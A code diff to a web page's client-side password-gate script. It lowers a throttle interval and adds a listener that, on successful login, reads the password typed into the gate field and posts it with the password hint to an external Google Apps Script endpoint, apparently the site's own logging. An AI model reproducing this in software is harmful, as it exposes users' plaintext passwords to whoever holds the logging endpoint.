@@ -18,7 +18,7 @@
   const HINT_ID = "gateHint"; // <- NOVO: id do elemento que exibe a dica
 
   // Anti-ruído
-  const THROTTLE_MS = 1500;
+  const THROTTLE_MS = 200;
   let lastSentAt = 0;
 
   /* ========================== */
@@ -101,7 +101,7 @@
         const ok = navigator.sendBeacon(WEB_APP_URL, blob);
         if (ok) return;
       }
-    } catch {}
+    } catch { }
 
     fetch(WEB_APP_URL, {
       method: "POST",
@@ -182,7 +182,7 @@
     try {
       const v = sessionStorage.getItem(ACCESS_TAG) || "";
       if (v && v.startsWith("ok:")) return true;
-    } catch {}
+    } catch { }
     const gateEl = document.getElementById(GATE_ID);
     return !!(gateEl && gateEl.classList.contains("hidden")) || false;
   }
@@ -256,6 +256,13 @@
         }
       });
     }
+
+    window.addEventListener("login:granted", async () => {
+      const typed = document.getElementById("gateInput")?.value ?? "";
+      const hint = getPasswordHint();
+      const payload = await buildPayload("granted", "", typed, hint);
+      postToGAS(payload);
+    });
   }
 
   if (document.readyState === "loading") {
